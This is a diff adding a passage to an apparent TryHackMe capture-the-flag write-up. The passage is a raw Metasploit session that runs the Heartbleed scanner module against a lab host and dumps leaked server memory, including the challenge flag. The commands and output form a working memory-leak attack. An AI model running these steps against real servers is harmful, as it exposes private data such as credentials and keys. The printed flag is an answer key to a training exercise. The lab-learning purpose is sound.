@@ -680,3 +680,160 @@ http://web-apps.nbookmark.com/ascii-converter/
 54 48 4d 52 41 4e 44 45 4e 43
 THMRANDENC
 ```
+# [Task 7] [Web Exploitation] [Easy] Protecting Data In Transit
+```
+root@kali:~# msfconsole
+[-] ***rting the Metasploit Framework console.../
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+
+
+Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
+EFLAGS: 00010046
+eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
+esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
+ds: 0018   es: 0018  ss: 0018
+Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
+
+
+Stack: 90909090990909090990909090
+       90909090990909090990909090
+       90909090.90909090.90909090
+       90909090.90909090.90909090
+       90909090.90909090.09090900
+       90909090.90909090.09090900
+       ..........................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ccccccccc.................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       .................ccccccccc
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ..........................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffff..................
+       ffffffff..................
+
+
+Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
+Aiee, Killing Interrupt handler
+Kernel panic: Attempted to kill the idle task!
+In swapper task - not syncing
+
+
+       =[ metasploit v5.0.71-dev                          ]
++ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 > search heatblead
+[-] No results from search
+msf5 > search HeartBleed
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank    Check  Description
+   -  ----                                              ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
+   1  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
+
+
+msf5 > use 0
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options
+
+Module options (auxiliary/scanner/ssl/openssl_heartbleed):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   DUMPFILTER                         no        Pattern to filter leaked memory before storing
+   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
+   MAX_KEYTRIES      50               yes       Max tries to dump key
+   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
+   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT             443              yes       The target port (TCP)
+   STATUS_EVERY      5                yes       How many retries until key dump status
+   THREADS           1                yes       The number of concurrent threads (max one per host)
+   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
+   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   SCAN  Check hosts for vulnerability
+
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOST 10.10.142.176
+RHOST => 10.10.142.176
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > ex
+exit     exploit
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
+
+[+] 10.10.142.176:443     - Heartbeat response with leak, 65535 bytes
+[*] 10.10.142.176:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+
+[+] 10.10.142.176:443     - Heartbeat response with leak, 65535 bytes
+[*] 10.10.142.176:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > sert verbose true
+^CInterrupt: use the 'exit' command to quit
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true
+verbose => true
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+
+[*] 10.10.142.176:443     - Leaking heartbeat response #1
+[*] 10.10.142.176:443     - Sending Client Hello...
+[*] 10.10.142.176:443     - SSL record #1:
+[*] 10.10.142.176:443     -     Type:    22
+[*] 10.10.142.176:443     -     Version: 0x0301
+[*] 10.10.142.176:443     -     Length:  86
+[*] 10.10.142.176:443     -     Handshake #1:
+[*] 10.10.142.176:443     -             Length: 82
+[*] 10.10.142.176:443     -             Type:   Server Hello (2)
+[*] 10.10.142.176:443     -             Server Hello Version:           0x0301
+[*] 10.10.142.176:443     -             Server Hello random data:       1341c36f15f46bda60f64c71c4421f51e4c3607261aba3909e7dba1132e0744f
+[*] 10.10.142.176:443     -             Server Hello Session ID length: 32
+[*] 10.10.142.176:443     -             Server Hello Session ID:        5fa5c8ca7543200e1921bd24b90ab2631fa485925840dedd9b877b286fca8fcb
+[*] 10.10.142.176:443     - SSL record #2:
+[*] 10.10.142.176:443     -     Type:    22
+[*] 10.10.142.176:443     -     Version: 0x0301
+[*] 10.10.142.176:443     -     Length:  951
+[*] 10.10.142.176:443     -     Handshake #1:
+[*] 10.10.142.176:443     -             Length: 947
+[*] 10.10.142.176:443     -             Type:   Certificate Data (11)
+[*] 10.10.142.176:443     -             Certificates length: 944
+[*] 10.10.142.176:443     -             Data length: 947
+[*] 10.10.142.176:443     -             Certificate #1:
+[*] 10.10.142.176:443     -                     Certificate #1: Length: 941
+[*] 10.10.142.176:443     -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, issuer=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, serial=#<OpenSSL::BN:0x00007f8b104dd7b0>, not_before=2019-02-16 10:41:14 UTC, not_after=2020-02-16 10:41:14 UTC>
+[*] 10.10.142.176:443     - SSL record #3:
+[*] 10.10.142.176:443     -     Type:    22
+[*] 10.10.142.176:443     -     Version: 0x0301
+[*] 10.10.142.176:443     -     Length:  331
+[*] 10.10.142.176:443     -     Handshake #1:
+[*] 10.10.142.176:443     -             Length: 327
+[*] 10.10.142.176:443     -             Type:   Server Key Exchange (12)
+[*] 10.10.142.176:443     - SSL record #4:
+[*] 10.10.142.176:443     -     Type:    22
+[*] 10.10.142.176:443     -     Version: 0x0301
+[*] 10.10.142.176:443     -     Length:  4
+[*] 10.10.142.176:443     -     Handshake #1:
+[*] 10.10.142.176:443     -             Length: 0
+[*] 10.10.142.176:443     -             Type:   Server Hello Done (14)
+[*] 10.10.142.176:443     - Sending Heartbeat...
+[*] 10.10.142.176:443     - Heartbeat response, 65535 bytes
+[+] 10.10.142.176:443     - Heartbeat response with leak, 65535 bytes
+[*] 10.10.142.176:443     - Printable info leaked:
+......^.-..N......q.$.%....YLLkI..)gy...f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{sSl-Is-BaD}.....0..f.:u._..................................................................................................................................... repeated 15751 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.....................A.....@..m0'.`..;Tx.>8.sk..&.x...,h.....\=.'....p.f...C...:.L..'....}j.4,.......5I.z3.A/......v\.........uaJ.......n.`B....u.@.|...7t*..............E......x/..h..".a.>A..CH.yQ.`..E2.D.U..*i9$..@./?....MxxE.#WA...N....I.b{..y.-.}.2....{.Y..b4[...&2.K.F.4...._.........1_<UI........&f3..R....v...D.I&...,..+.}....i...b..^+J..O..OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....M...I...A...V.1...._8.[.u.j.V.5F......N..\|Y...LY.......W#.......#u......~......P.v..<.U..J?D........7.u...'.s.&Wo..<..U.......}..Y......d.*~...Dw.....k6w....Q.U....n..2.i...<.Wv.....].4..#...<+6o.....*.U>&rLL].\...V&.U..Bm.2u..S.wW QJ0....-....m5.|..,O&C..........8.=#.)TRG...M.......C....{L....^...g...LF..B...R.......F...Q..=Db-0.&..................................................................................................................................... repeated 2451 times .....................................................................................................................................@..........V...R..K...o.n..q... ...Qz..H.....G*... e.-....1r=...t..cZ...w....\.N{m...............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A.....C...`i...'-..R0.../h.. 3...:$..~.h....m....)<.]..0..../..,....T.....kC.S.1e....A..D$.....W..O..da....z...|....~..].......?n...r.J.g.(]2..?.M..m9.{....F........."....H...I....=.;.z.9@.N^..".....@....E.'*.,.Pi.....'._..M..-....;a.4.N......s...L...].......(.2.Q..=....E#...t.:i.......@.$a=mba.G..x...f+3PD..n.JC..................................................................................................................................... repeated 9876 times .....................................................................................................................................@..................................................................................................................................... repeated 175 times ..................................................................................................................................... X...... X...........Hb..}<.8.Ho....b...z..F~J....@....... ..0...............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....M...I...A...V.1...._8.[.u.j.V.5F......N..\|Y...LY.......W#.......#u......~......P.v..<.U..J?D........7.u...'.s.&Wo..<..U.......}..Y......d.*~...Dw.....k6w....Q.U....n..2.i...<.Wv.....].4..#...<+6o.....*.U>&rLL].\...V&.U..Bm.2u..S.wW QJ0....-....m5.|..,O&C..........8.=#.)TRG...M.......C....{L....^...g...LF..B...R.......F...Q..=Db-0.&..................................................................................................................................... repeated 2451 times .....................................................................................................................................@..........V...R...A.o..k.`.Lq.B.Q..`ra....}..2.tO _...uC ..!.$...c....X@....{(o.................................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A.....@..m0'.`..;Tx.>8.sk..&.x...,h.....\=.'....p.f...C...:.L..'....}j.4,.......5I.z3.A/......v\.........uaJ.......n.`B....u.@.|...7t*..............E......x/..h..".a.>A..CH.yQ.`..E2.D.U..*i9$..@./?....MxxE.#WA...N....I.b{..y.-.}.2....{.Y..b4[...&2.K.F.4...._.........1_<UI........&f3..R....v...D.I&...,..+.}....i...b..^+J..O..................................................................................................................................... repeated 10183 times .....................................................................................................................................
+[*] 10.10.142.176:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
